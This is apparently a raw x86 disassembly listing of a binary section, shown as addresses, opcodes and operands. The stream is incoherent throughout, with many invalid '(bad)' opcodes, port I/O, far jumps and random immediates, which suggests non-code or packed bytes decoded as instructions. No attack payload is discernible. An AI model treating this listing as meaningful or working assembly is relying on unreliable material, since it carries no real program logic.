  4254fc:	add    ah,bl
  4254fe:	pushf  
  4254ff:	inc    ebx
  425500:	mov    ds,WORD PTR [edi*1+0x1171ca7]
  425507:	ds sbb eax,0x1545345b
  42550d:	mov    edi,esp
  42550f:	std    
  425510:	popa   
  425511:	push   cs
  425512:	lds    ebx,FWORD PTR [ebp-0x1c16b18f]
  425518:	mov    edi,0xf3b0485e
  42551d:	lock jae 0x4254c5
  425520:	jp     0x5315a97d
  425526:	or     DWORD PTR [ebx-0x57],0x13
  42552a:	(bad)  
  42552b:	je     0x425588
  42552d:	arpl   WORD PTR [edx-0x40128326],bx
  425533:	pop    es
  425534:	aad    0x82
  425536:	fidiv  WORD PTR [edi]
  425538:	cmp    eax,0x56498388
  42553d:	mov    gs,WORD PTR [edi-0x2a]
  425540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425541:	dec    ebx
  425542:	test   DWORD PTR [ebx],edx
  425544:	ins    DWORD PTR es:[edi],dx
  425545:	jae    0x4254f2
  425547:	mov    dl,0x84
  425549:	sti    
  42554a:	mov    ebp,0x9148652a
  42554f:	stc    
  425550:	and    DWORD PTR [esp+eax*2+0x4472d1a7],0xffffffff
  425558:	push   cs
  425559:	fst    QWORD PTR ds:0x1f33be05
  42555f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425561:	adc    BYTE PTR [ecx],0xc9
  425564:	int    0xf7
  425566:	and    al,0xa4
  425568:	leave  
  425569:	(bad)  
  42556a:	fucomp st(6)
  42556c:	scas   al,BYTE PTR es:[edi]
  42556d:	lods   eax,DWORD PTR ds:[esi]
  42556e:	rcl    DWORD PTR [esi-0x7cfe71b3],0xf7
  425575:	push   edx
  425576:	jmp    0x4255a7
  425578:	and    BYTE PTR [ecx+0x17dcd111],bh
  42557e:	gs dec si
  425581:	sbb    eax,0x7f9c9792
  425586:	bound  ebp,QWORD PTR [edx]
  425588:	xor    eax,0xb4c267f8
  42558d:	mul    ecx
  42558f:	daa    
  425590:	shl    DWORD PTR [edi-0x3aba4542],1
  425596:	lods   al,BYTE PTR ds:[esi]
  425597:	or     DWORD PTR [ebx-0x70],edx
  42559a:	lods   al,BYTE PTR ds:[esi]
  42559b:	cmp    ch,BYTE PTR [edx+0x549d035e]
  4255a1:	outs   dx,BYTE PTR ds:[esi]
  4255a2:	(bad)  
  4255a3:	sub    al,0xb4
  4255a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255a6:	fldcw  WORD PTR [ebx+eiz*8-0x3ed9cce]
  4255ad:	aad    0xd1
  4255af:	in     eax,dx
  4255b0:	aaa    
  4255b1:	push   ebp
  4255b2:	pop    es
  4255b3:	es (bad) 
  4255b5:	fnstsw WORD PTR [ebp-0x69d541d5]
  4255bb:	leave  
  4255bc:	mov    eax,ds:0x20f0f072
  4255c1:	mov    edx,0x3d28e2ca
  4255c6:	xor    al,0xc7
  4255c8:	aam    0xa5
  4255ca:	push   ds
  4255cb:	mov    ebp,DWORD PTR [eax+0x41]
  4255ce:	rol    esi,0x6b
  4255d1:	pop    ebx
  4255d2:	shr    dl,0xf6
  4255d5:	daa    
  4255d6:	and    al,0xff
  4255d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255d9:	scas   al,BYTE PTR es:[edi]
  4255da:	dec    esi
  4255db:	gs cmp al,0xc8
  4255de:	pop    esi
  4255df:	adc    al,0xf2
  4255e1:	fwait
  4255e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255e3:	retf   0x2c23
  4255e6:	and    ebx,DWORD PTR [eax+0x2b8d818a]
  4255ec:	xchg   esp,eax
  4255ed:	mov    edi,0x1e124b66
  4255f2:	cmp    al,0x8c
  4255f4:	pmulhuw mm3,QWORD PTR [edx]
  4255f7:	arpl   WORD PTR [edi-0x58],dx
  4255fa:	js     0x4255a3
  4255fc:	jno    0x425674
  4255fe:	mov    dh,0x7b
  425600:	jne    0x425665
  425602:	fisub  WORD PTR [ebx+0x110e347d]
  425608:	sub    DWORD PTR [eax],esp
  42560a:	fbld   TBYTE PTR [ebx-0xfbbc8f4]
  425610:	pop    ss
  425611:	loop   0x425595
  425613:	dec    eax
  425614:	ds (bad) 
  425616:	push   eax
  425617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425618:	jne    0x425698
  42561a:	mov    ch,0x21
  42561c:	dec    edx
  42561d:	test   BYTE PTR [ecx+0x34],al
  425620:	mov    ds:0x68e3d3ec,eax
  425625:	push   ss
  425626:	inc    edx
  425627:	jg     0x4255e4
  425629:	out    dx,al
  42562a:	outs   dx,DWORD PTR ds:[esi]
  42562b:	stos   BYTE PTR es:[edi],al
  42562c:	imul   eax,DWORD PTR [edi+esi*2],0x3f5e2eff
  425633:	sbb    al,0x41
  425635:	adc    ch,BYTE PTR [ecx]
  425637:	js     0x42561d
  425639:	jp     0x42560f
  42563b:	mov    ds:0x4fbc624c,eax
  425640:	clc    
  425641:	test   eax,0x5d6fd40b
  425646:	adc    ah,ah
  425648:	mul    BYTE PTR [edi]
  42564a:	add    al,0x69
  42564c:	stos   BYTE PTR es:[edi],al
  42564d:	jno    0x42566d
  42564f:	test   DWORD PTR [eax+0x5c4a15e2],ebx
  425655:	mov    esp,0x31eaf7a8
  42565a:	xchg   edx,eax
  42565b:	aaa    
  42565c:	dec    esi
  42565d:	sbb    DWORD PTR [edi*8-0x6116c5a2],esp
  425664:	xor    bh,BYTE PTR [ebp+0x52d75320]
  42566a:	test   BYTE PTR [edi-0x44c9ef9],al
  425670:	inc    eax
  425671:	data16 into 
  425673:	sub    ch,ah
  425675:	xor    BYTE PTR [ecx+0x208471fb],cl
  42567b:	xlat   BYTE PTR ds:[ebx]
  42567c:	fisubr DWORD PTR [eax+0x34]
  42567f:	(bad)  
  425680:	mov    al,0xf1
  425682:	std    
  425683:	fsubrp st(4),st
  425685:	xchg   edi,eax
  425686:	xor    ecx,DWORD PTR [edi-0x6c4097df]
  42568c:	and    ah,al
  42568e:	loope  0x4256e2
  425690:	pusha  
  425691:	add    al,0xdf
  425693:	cmp    al,0xd1
  425695:	mov    ah,0x16
  425697:	ffree  st(3)
  425699:	sub    edi,eax
  42569b:	xlat   BYTE PTR ds:[ebx]
  42569c:	stos   DWORD PTR es:[edi],eax
  42569d:	xchg   BYTE PTR [ecx-0x73c652ea],al
  4256a3:	(bad)  
  4256a4:	(bad)  
  4256a5:	(bad)  
  4256a6:	push   eax
  4256a7:	xchg   edi,eax
  4256a8:	fsubr  st(3),st
  4256aa:	retf   
  4256ab:	adc    esi,DWORD PTR [esi-0x5a]
  4256ae:	sub    al,0x0
	...
  4256b8:	add    BYTE PTR [eax],al
  4256ba:	mov    esi,0x74ef74ea
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	in     eax,0x47
  4256c8:	(bad)  
  4256c9:	adc    DWORD PTR [esi-0x2fffe32],edx
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR [esi],ch
  4256d3:	pusha  
  4256d4:	push   0xf9d88e87
  4256d9:	lahf   
  4256da:	jmp    0x4256d0
  4256dc:	ror    BYTE PTR [eax-0x560317ac],1
  4256e2:	daa    
  4256e3:	inc    esi
  4256e4:	into   
  4256e5:	mov    eax,0x97cf5233
  4256ea:	mov    fs,WORD PTR [ebx-0x33bd2ff6]
  4256f0:	shl    BYTE PTR [eax+0x54],0xb7
  4256f4:	mov    esp,0x7521aab6
  4256f9:	push   edi
  4256fa:	pop    eax
  4256fb:	test   DWORD PTR [ebx+0x5c],edi
  4256fe:	clc    
  4256ff:	dec    edi
  425700:	jl     0x425779
  425702:	rcl    DWORD PTR [esi-0x2],cl
  425705:	leave  
  425706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425707:	call   0x5246b3c5
  42570c:	stc    
  42570d:	xchg   ecx,eax
  42570e:	push   ecx
  42570f:	xor    al,ch
  425711:	pop    eax
  425712:	push   cs
  425713:	enter  0xd88a,0xf9
  425717:	mov    ds:0x6aefbddc,al
  42571c:	add    ch,BYTE PTR [ebx-0x47]
  42571f:	adc    edx,DWORD PTR [ebp+0x55]
  425722:	or     al,0x33
  425724:	push   edi
  425725:	adc    eax,0x6d4b6d28
  42572a:	dec    esi
  42572b:	loope  0x4256bd
  42572d:	test   al,0x39
  42572f:	xchg   edx,eax
  425730:	sti    
  425731:	enter  0x3b33,0xad
  425735:	outs   dx,BYTE PTR ds:[esi]
  425736:	mov    esi,0x8d6f2af7
  42573b:	sbb    cl,BYTE PTR [esi-0x208153df]
  425741:	in     al,0xf6
  425743:	add    BYTE PTR [ebp-0x3d948208],al
  425749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42574a:	into   
  42574b:	dec    ebp
  42574c:	loope  0x42579d
  42574e:	and    al,0x1
  425750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425751:	push   esp
  425752:	jl     0x4257a6
  425754:	in     eax,0x17
  425756:	and    BYTE PTR ds:0x8c0b3ed2,dh
  42575c:	mov    eax,ds:0x31c9e0dd
  425761:	in     al,0x76
  425763:	popa   
  425764:	ret    0xb086
  425767:	push   ecx
  425768:	mul    BYTE PTR [edi]
  42576a:	lea    eax,[edi]
  42576c:	mov    ds:0xec523585,eax
  425771:	or     eax,0xb177457a
  425776:	add    BYTE PTR [eax+0x25],al
  425779:	push   ecx
  42577a:	or     ch,bh
  42577c:	push   ebp
  42577d:	(bad)  
  42577e:	fidiv  DWORD PTR [eax]
  425780:	xchg   ebx,eax
  425781:	push   esp
  425782:	test   BYTE PTR [ebx],dl
  425784:	cwde   
  425785:	xchg   ebx,eax
  425786:	push   0x4712a5de
  42578b:	dec    edi
  42578c:	fldenv [ebp+0x8eea696]
  425792:	sub    DWORD PTR [ecx+0x3dcd1939],edi
  425798:	jae    0x425801
  42579a:	mov    bh,0x8a
  42579c:	out    0x94,al
  42579e:	lock mov al,0xf4
  4257a1:	push   es
  4257a2:	out    dx,eax
  4257a3:	cmp    BYTE PTR [ecx+0x5e],0x63
  4257a7:	and    esi,eax
  4257a9:	pop    edi
  4257aa:	pop    esp
  4257ab:	mov    edx,DWORD PTR [edi+0x2febbaf1]
  4257b1:	ror    DWORD PTR [edi],cl
  4257b3:	lods   eax,DWORD PTR ds:[esi]
  4257b4:	fidiv  DWORD PTR [edi-0x28b0de53]
  4257ba:	mov    edx,0x9832e0c2
  4257bf:	(bad)  
  4257c0:	leave  
  4257c1:	or     al,0x60
  4257c3:	mov    eax,ds:0xc920323
  4257c8:	jae    0x4257b1
  4257ca:	mov    ebx,0x117462bf
  4257d0:	jmp    0x81e394fc
  4257d5:	arpl   dx,sp
  4257d7:	pop    esi
  4257d8:	clc    
  4257d9:	push   es
  4257da:	into   
  4257db:	imul   eax,DWORD PTR [ebp+0x27d298ca],0x30
  4257e2:	and    edx,DWORD PTR [ebx]
  4257e4:	push   ecx
  4257e5:	lods   eax,DWORD PTR ds:[esi]
  4257e6:	cmp    edx,edx
  4257e8:	mov    esp,0xbfd0157b
  4257ed:	jp     0x42578b
  4257ef:	pushf  
  4257f0:	sub    BYTE PTR [ecx-0x69],dh
  4257f3:	dec    eax
  4257f4:	ins    DWORD PTR es:[edi],dx
  4257f5:	fstp   DWORD PTR [edi-0x2c]
  4257f8:	sar    DWORD PTR [esi+0x439218f4],0xf0
  4257ff:	fs jg  0x42587f
  425802:	repz mov edi,0x491c37e8
  425808:	mov    al,ds:0x78bae693
  42580d:	push   ds
  42580e:	das    
  42580f:	mov    ?,WORD PTR [eax]
  425811:	push   ebx
  425812:	leave  
  425813:	jae    0x42584f
  425815:	idiv   BYTE PTR [edi]
  425817:	dec    ebx
  425818:	jno    0x4257e3
  42581a:	cdq    
  42581b:	(bad)  
  42581c:	push   edi
  42581d:	popf   
  42581e:	cld    
  42581f:	mov    ecx,0xdc4cdd3d
  425824:	jp     0x42589f
  425826:	sbb    eax,0x38
  425829:	retf   
  42582a:	addr16 test eax,0xe0a04d68
  425830:	adc    eax,0x2dcb344b
  425835:	mov    edx,0xdb6a94f8
  42583a:	jge    0x425865
  42583c:	sbb    BYTE PTR [ecx],al
  42583e:	imul   esp,edx,0x678d73d6
  425844:	mov    BYTE PTR [edx+0x15],ch
  425847:	xor    bh,BYTE PTR [ecx-0x6369a59]
  42584d:	xchg   ebx,eax
  42584e:	mov    dl,0x8b
  425850:	sbb    al,0xc4
  425852:	jge    0x425811
  425854:	iret   
  425855:	and    BYTE PTR [ebp+0x27],al
  425858:	adc    esi,DWORD PTR [edx]
  42585a:	cmp    cl,ch
  42585c:	mov    edi,0xd38ecf5b
  425861:	clc    
  425862:	inc    edx
  425863:	frstor [edi-0x57]
  425866:	lds    esp,FWORD PTR [edi+0x1b]
  425869:	rol    DWORD PTR [ecx-0x4],cl
  42586c:	je     0x42589e
  42586e:	add    al,0xe2
  425870:	inc    edx
  425871:	pushf  
  425872:	sar    BYTE PTR [ebx-0x37],0x80
  425876:	xchg   esp,eax
  425877:	call   0xb205902b
  42587c:	(bad)  
  42587d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42587e:	push   0xfffffff9
  425880:	push   edx
  425881:	int3   
  425882:	out    dx,eax
  425883:	rcr    BYTE PTR [edx+0x37],cl
  425886:	daa    
  425887:	loopne 0x425895
  425889:	dec    esi
  42588a:	or     ebx,DWORD PTR [esi-0x33]
  42588d:	dec    edi
  42588e:	xchg   ebp,eax
  42588f:	js     0x42587a
  425891:	lahf   
  425892:	sbb    eax,0xc4f1fd0d
  425897:	jae    0x4258bc
  425899:	call   FWORD PTR [ecx+0x2481d2e9]
  42589f:	xchg   ebp,eax
  4258a0:	sbb    eax,0x632c9ec6
  4258a5:	sub    bh,dh
  4258a7:	test   DWORD PTR [ecx-0x50142448],esp
  4258ad:	std    
  4258ae:	mov    ch,0xc
  4258b0:	mov    al,0xb9
  4258b2:	push   esi
  4258b3:	jae    0x4258b5
  4258b5:	mov    ch,0x64
  4258b7:	sub    ch,cl
  4258b9:	push   es
  4258ba:	jge    0x42586b
  4258bc:	rcr    ah,1
  4258be:	adc    bh,BYTE PTR [ecx+ecx*8-0x56]
  4258c2:	jp     0x425925
  4258c4:	sbb    DWORD PTR [ebp+0x74],ebp
  4258c7:	push   ebp
  4258c8:	xor    al,0x79
  4258ca:	out    0x6b,al
  4258cc:	add    DWORD PTR [ebx+0x9d],ebp
	...
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	pop    es
  4258e7:	in     al,0x2c
  4258e9:	push   ebp
  4258ea:	xchg   ebx,eax
  4258eb:	rol    BYTE PTR [ecx],1
  4258ed:	add    ch,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [ecx-0x4153613e],dh
  4258f7:	out    0xe6,al
  4258f9:	xchg   BYTE PTR [eax+0x2f],ah
  4258fc:	repz inc ebx
  4258fe:	mov    ebp,0xae35b1e9
  425903:	retf   
  425904:	xor    dl,BYTE PTR [ecx+esi*8+0x67]
  425908:	leave  
  425909:	dec    BYTE PTR [edx]
  42590b:	popa   
  42590c:	push   ebx
  42590d:	cmp    al,0x0
  42590f:	or     eax,DWORD PTR [eax]
  425911:	sbb    ah,BYTE PTR [esp+edx*2]
  425914:	jecxz  0x425975
  425916:	scas   eax,DWORD PTR es:[edi]
  425917:	out    dx,eax
  425918:	mov    dh,BYTE PTR [edi-0xe]
  42591b:	mov    cl,0x14
  42591d:	cli    
  42591e:	sub    ecx,esp
  425920:	cwde   
  425921:	fild   WORD PTR [esi-0x40340b3a]
  425927:	jae    0x42595c
  425929:	adc    BYTE PTR [ebx-0x27],al
  42592c:	hlt    
  42592d:	xchg   esi,eax
  42592e:	inc    eax
  42592f:	out    0xff,eax
  425931:	js     0x4258bf
  425933:	sub    bl,dh
  425935:	xchg   DWORD PTR ds:0x458f1139,esp
  42593b:	in     eax,0xa1
  42593d:	shl    DWORD PTR [edi-0x6b523b4f],0x7b
  425944:	push   DWORD PTR [edx]
  425946:	mov    ds,WORD PTR [ebx]
  425948:	inc    esp
  425949:	imul   ebp,DWORD PTR [ebx-0x9],0x18
  42594d:	int3   
  42594e:	and    edi,DWORD PTR cs:[esi+0x4c]
  425952:	mov    edx,0x36a4deea
  425957:	pop    ecx
  425958:	out    dx,eax
  425959:	push   es
  42595a:	xchg   edi,eax
  42595b:	mov    dh,0xed
  42595d:	push   ecx
  42595f:	fisub  DWORD PTR [ecx+0x2d5499fe]
  425965:	xor    edi,DWORD PTR [ecx]
  425967:	xchg   ebx,eax
  425968:	imul   BYTE PTR [ecx+0x4eefe0b3]
  42596e:	push   ebx
  42596f:	mov    bl,bl
  425971:	enter  0x4689,0x73
  425975:	ret    0x32c9
  425978:	ins    DWORD PTR es:[edi],dx
  425979:	sub    DWORD PTR [eax+0x5d8158b2],ecx
  42597f:	data16 sbb bl,bl
  425982:	sti    
  425983:	div    DWORD PTR [edx-0x1b]
  425986:	stos   DWORD PTR es:[edi],eax
  425987:	xlat   BYTE PTR ds:[ebx]
  425988:	dec    ebp
  425989:	push   0x6f4c0609
  42598e:	clc    
  42598f:	out    dx,al
  425990:	icebp  
  425991:	scas   al,BYTE PTR es:[edi]
  425992:	popf   
  425993:	arpl   WORD PTR [edx+ebx*8],bx
  425996:	es add al,0xa0
  425999:	pushf  
  42599a:	test   BYTE PTR [edx+0x2bca8c79],al
  4259a0:	mov    ch,BYTE PTR [edx+edx*2]
  4259a3:	jno    0x42596a
  4259a5:	push   eax
  4259a6:	dec    esi
  4259a7:	dec    ebx
  4259a8:	ja     0x4259cc
  4259aa:	mov    ah,0x22
  4259ac:	sub    al,ah
  4259ae:	inc    ebx
  4259af:	lods   eax,DWORD PTR ds:[esi]
  4259b0:	leave  
  4259b1:	cs aas 
  4259b3:	out    dx,eax
  4259b4:	cld    
  4259b5:	jecxz  0x4259ae
  4259b7:	rcr    BYTE PTR [ebx+0x37e01ca3],1
  4259bd:	adc    BYTE PTR [ebx],cl
  4259bf:	xchg   edx,eax
  4259c0:	jl     0x425960
  4259c2:	xchg   ebp,ecx
  4259c4:	add    BYTE PTR [ecx],dh
  4259c6:	ins    DWORD PTR es:[edi],dx
  4259c7:	sub    DWORD PTR [ebx+0x6772b0a],0xffffffe7
  4259ce:	lahf   
  4259cf:	push   es
  4259d0:	push   esi
  4259d1:	das    
  4259d2:	inc    ebp
  4259d3:	sbb    esp,DWORD PTR [eax+0x4b8559eb]
  4259d9:	jl     0x425977
  4259db:	add    esp,eax
  4259dd:	(bad)  
  4259de:	sub    DWORD PTR [eax-0x3423fe89],ebp
  4259e4:	dec    ebx
  4259e5:	lods   al,BYTE PTR ds:[esi]
  4259e6:	inc    ebp
  4259e7:	sbb    al,0x1b
  4259e9:	push   cs
  4259ea:	rcl    BYTE PTR [edx],cl
  4259ec:	mov    eax,0x344452f1
  4259f1:	xor    bl,BYTE PTR [edx+edi*1+0x10]
  4259f5:	ds adc eax,0x6d5f8e3b
  4259fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259fc:	pop    edi
  4259fd:	jbe    0x425a2d
  4259ff:	in     eax,0x48
  425a01:	jbe    0x4259a8
  425a03:	sub    al,0x1f
  425a05:	xor    DWORD PTR gs:[esi+0x8],esi
  425a09:	and    ebp,edi
  425a0b:	mov    cl,0xba
  425a0d:	jmp    0x883e:0xefd5289
  425a14:	mov    ah,BYTE PTR [esi+0x7a]
  425a17:	aas    
  425a18:	dec    ebx
  425a19:	retf   
  425a1a:	or     ecx,DWORD PTR [esi]
  425a1c:	ror    BYTE PTR [ecx],cl
  425a1e:	mov    ch,0xc8
  425a20:	and    DWORD PTR [eax],edx
  425a22:	pop    esp
  425a23:	inc    ecx
  425a24:	pop    ds
  425a25:	jmp    0x167d:0xa198ea70
  425a2c:	mov    dh,0x45
  425a2e:	mov    eax,ds:0xe7540401
  425a33:	int    0xa2
  425a35:	mov    WORD PTR [ebp-0x3a032f0f],?
  425a3b:	xchg   bh,dl
  425a3d:	and    al,al
  425a3f:	inc    eax
  425a40:	jecxz  0x4259f4
  425a42:	bound  ebp,QWORD PTR [ebp-0x206cca4]
  425a48:	gs dec ebx
  425a4a:	fwait
  425a4b:	or     BYTE PTR [edi+0x50b4fe74],0xb2
  425a52:	popa   
  425a53:	pop    edi
  425a54:	push   ebp
  425a55:	jno    0x425a48
  425a57:	cmp    DWORD PTR [edx+esi*1-0x22404508],esi
  425a5e:	push   ds
  425a5f:	add    cl,BYTE PTR ss:[eax]
  425a62:	inc    ebx
  425a63:	test   esi,edi
  425a65:	pop    ds
  425a66:	cld    
  425a67:	dec    ebx
  425a68:	pushf  
  425a69:	ficom  WORD PTR [edx-0xd646add]
  425a6f:	popf   
  425a70:	in     eax,dx
  425a71:	jo     0x4259fb
  425a73:	test   eax,0x2e6d0456
  425a78:	arpl   WORD PTR [eax+0x4a],ax
  425a7b:	jp     0x425ae8
  425a7d:	push   cs
  425a7e:	mov    esp,?
  425a80:	int3   
  425a81:	ret    0x8724
  425a84:	fadd   DWORD PTR fs:[ecx]
  425a87:	ins    BYTE PTR es:[edi],dx
  425a88:	int3   
  425a89:	jmp    0x95270965
  425a8e:	jecxz  0x425aef
  425a90:	fbstp  TBYTE PTR [eax+0x68]
  425a93:	arpl   WORD PTR ds:0xf17df828,di
  425a99:	and    ah,BYTE PTR [esi-0x72fe097e]
  425a9f:	adc    DWORD PTR [edx+0x40],esp
  425aa2:	outs   dx,BYTE PTR ds:[esi]
  425aa3:	xor    dh,bh
  425aa5:	push   0x3
  425aa7:	fisub  WORD PTR [esi+0x41]
  425aaa:	dec    ebp
  425aab:	sbb    eax,DWORD PTR [ebx+0x76]
  425aae:	jecxz  0x425ad7
  425ab0:	mov    al,ds:0xa8d0d72c
  425ab5:	inc    esi
  425ab6:	enter  0x3d10,0xa7
  425aba:	ss jmp 0x425b08
  425abd:	in     eax,0xfe
  425abf:	mov    ebx,DWORD PTR [ebp+ecx*8-0x7a]
  425ac3:	stos   BYTE PTR es:[edi],al
  425ac4:	inc    ecx
  425ac5:	bound  edx,QWORD PTR [edx-0x5]
  425ac8:	gs enter 0x51a,0xd
  425acd:	inc    esp
  425ace:	rol    BYTE PTR [edx],1
  425ad0:	and    al,0xa4
  425ad2:	cmp    edi,DWORD PTR [esp+edi*2]
  425ad5:	inc    ebp
  425ad6:	xchg   esp,eax
  425ad7:	(bad)  
  425ad8:	das    
  425ad9:	stos   BYTE PTR es:[edi],al
  425ada:	sbb    edx,DWORD PTR [edx]
  425adc:	mov    edi,0x74e510b7
  425ae1:	shl    DWORD PTR [edi+0x2c],0xa1
  425ae5:	mov    eax,0x821c0eff
  425aea:	(bad)  
  425aec:	pop    ds
  425aed:	and    DWORD PTR [eax],0x0
  425af3:	add    BYTE PTR [eax],al
  425af5:	add    BYTE PTR [eax],al
  425af7:	add    BYTE PTR [eax],al
  425af9:	add    BYTE PTR [edx-0x5b61f90],ch
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	test   al,0x5d
  425b08:	mul    DWORD PTR [edx]
  425b0a:	nop
  425b0b:	rol    BYTE PTR [ecx],cl
  425b0d:	add    ch,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [edx-0x109965c4],dh
  425b17:	push   cs
  425b18:	rcl    esi,1
  425b1a:	data16 adc BYTE PTR [esi+ebp*4],cl
  425b1e:	pop    ebp
  425b1f:	cld    
  425b20:	xor    dl,BYTE PTR [edx+eax*8]
  425b23:	aad    0xf1
  425b25:	test   DWORD PTR [ebp-0x47],ebx
  425b28:	mov    ds:0xd4d893d8,eax
  425b2d:	sub    BYTE PTR [ebp+ebx*4-0x5281bf86],al
  425b34:	int    0xd7
  425b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b37:	sub    esi,DWORD PTR ds:0x88919850
  425b3d:	aaa    
  425b3e:	jp     0x425b73
  425b40:	pushf  
  425b41:	cmp    ebx,DWORD PTR [edi]
  425b43:	dec    ecx
  425b44:	inc    esp
  425b45:	les    ebp,FWORD PTR ds:0xf8e56387
  425b4b:	int3   
  425b4c:	sbb    BYTE PTR [ebx],dl
  425b4e:	aad    0xc8
  425b50:	xor    edi,eax
  425b52:	aad    0x28
  425b54:	jl     0x425bbf
  425b56:	js     0x425b8f
  425b58:	mov    al,es:0xc7bf8daf
  425b5e:	inc    edi
  425b5f:	mov    esp,0xe4bfa2a3
  425b64:	ds out 0x9c,al
  425b67:	pop    edi
  425b68:	and    eax,0x726f4a2e
  425b6d:	add    ah,BYTE PTR [eax+0x20]
  425b70:	add    ecx,DWORD PTR [esi]
  425b72:	cld    
  425b73:	iret   
  425b74:	bound  ebp,QWORD PTR [eax]
  425b76:	xchg   DWORD PTR [eax],edi
  425b78:	mov    dh,BYTE PTR [esi]
  425b7a:	test   BYTE PTR [eax+0x39618018],bh
  425b80:	fild   QWORD PTR [eax]
  425b82:	ja     0x425bda
  425b84:	bt     DWORD PTR [edx+0x4856da6e],0x15
  425b8c:	and    al,0xd9
  425b8e:	adc    DWORD PTR [esi+0x1f58b14b],0xffffffc3
  425b95:	xor    BYTE PTR [edi+0x4b7036b9],bh
  425b9b:	loop   0x425bd2
  425b9d:	or     eax,0x975d268b
  425ba2:	sub    al,0x6c
  425ba4:	sbb    ah,BYTE PTR [eax]
  425ba6:	loopne 0x425b28
  425ba8:	call   0xda77fc08
  425bad:	cmp    BYTE PTR [eax-0x1],0x1f
  425bb1:	adc    edi,DWORD PTR [ecx]
  425bb3:	cwde   
  425bb4:	sbb    al,0x56
  425bb6:	lods   al,BYTE PTR ds:[esi]
  425bb7:	mov    bl,0x2c
  425bb9:	xor    ch,al
  425bbb:	jb     0x425b4d
  425bbd:	or     dh,BYTE PTR [eax+0xdeac5c6]
  425bc3:	imul   esi,ebp,0xffffffb7
  425bc6:	lods   eax,DWORD PTR ds:[esi]
  425bc7:	outs   dx,BYTE PTR ss:[esi]
  425bc9:	mov    al,ds:0x1d241af5
  425bce:	ins    BYTE PTR es:[edi],dx
  425bcf:	add    edx,DWORD PTR ds:0xddb6b59e
  425bd5:	and    ebp,eax
  425bd7:	sub    al,0xdd
  425bd9:	fs dec eax
  425bdb:	dec    edx
  425bdc:	test   DWORD PTR [edi-0x710fcd7],ebp
  425be2:	and    DWORD PTR [ebx+0x5c],ebp
  425be5:	xchg   DWORD PTR [eax-0x74a531cd],esp
  425beb:	out    dx,al
  425bec:	test   al,0x11
  425bee:	dec    eax
  425bef:	sbb    BYTE PTR [ebp+ebp*8-0x75cd8a10],cl
  425bf6:	mov    dh,dl
  425bf8:	lods   eax,DWORD PTR ds:[esi]
  425bf9:	pop    eax
  425bfa:	cmp    DWORD PTR [bx+si-0x27],esp
  425bfe:	lock (bad) 
  425c00:	loope  0x425ba6
  425c02:	push   esi
  425c03:	les    esi,FWORD PTR [edx]
  425c05:	add    BYTE PTR [ebx-0x36af1aa6],al
  425c0b:	push   esp
  425c0c:	cmp    bl,BYTE PTR [eax-0x17]
  425c0f:	push   cs
  425c10:	ror    ecx,1
  425c12:	retf   
  425c13:	mov    BYTE PTR [edi],bh
  425c15:	sbb    BYTE PTR [eax],al
  425c17:	sub    DWORD PTR ds:0xf3798a80,eax
  425c1d:	in     al,dx
  425c1e:	stc    
  425c1f:	sbb    al,0xd8
  425c21:	mov    dl,0xd4
  425c23:	ins    DWORD PTR es:[edi],dx
  425c24:	ret    0x46f9
  425c27:	add    ebp,ebp
  425c29:	aaa    
  425c2a:	cmp    al,0xb3
  425c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c2d:	xor    edx,ecx
  425c2f:	sbb    eax,0xc14b68fd
  425c34:	in     al,dx
  425c35:	ins    BYTE PTR es:[edi],dx
  425c36:	sub    dh,BYTE PTR [ecx+0x2146cda8]
  425c3c:	out    dx,eax
  425c3d:	jl     0x425cbd
  425c3f:	or     eax,0xf98316d0
  425c44:	lea    esp,ds:0xb63aef64
  425c4a:	test   eax,0x51812ec
  425c4f:	sbb    ecx,DWORD PTR [ecx]
  425c51:	loope  0x425c06
  425c53:	inc    ecx
  425c54:	xchg   ebp,eax
  425c55:	test   BYTE PTR [ecx+0x3d930294],ch
  425c5b:	mov    ch,0xe7
  425c5d:	sub    al,0x7d
  425c5f:	int3   
  425c60:	sub    ah,0xd3
  425c63:	repnz fadd DWORD PTR [ebx]
  425c66:	dec    edx
  425c67:	(bad)  
  425c68:	dec    ebp
  425c69:	mov    ecx,0x61e34113
  425c6e:	push   ebp
  425c6f:	pop    ecx
  425c70:	inc    ebx
  425c71:	je     0x425ca9
  425c73:	jns    0x425c74
  425c75:	es test al,0x2e
  425c78:	inc    ecx
  425c79:	mov    bh,BYTE PTR [ecx]
  425c7b:	push   ecx
  425c7c:	sbb    eax,0x263de392
  425c81:	cmp    esp,0xffffff9a
  425c84:	cmc    
  425c85:	pop    ds
  425c86:	push   ss
  425c87:	inc    edx
  425c88:	lods   eax,DWORD PTR ds:[esi]
  425c89:	jle    0x425c86
  425c8b:	mov    bl,0x46
  425c8d:	inc    edx
  425c8e:	mov    ds,edi
  425c90:	xchg   edx,eax
  425c91:	dec    ecx
  425c92:	sbb    DWORD PTR [ebp*8-0x77a15ab2],edi
  425c99:	pop    esi
  425c9a:	fnstcw WORD PTR [eax+0x15]
  425c9d:	(bad)  
  425c9e:	out    0x8a,al
  425ca0:	(bad)  
  425ca1:	call   0x593e228f
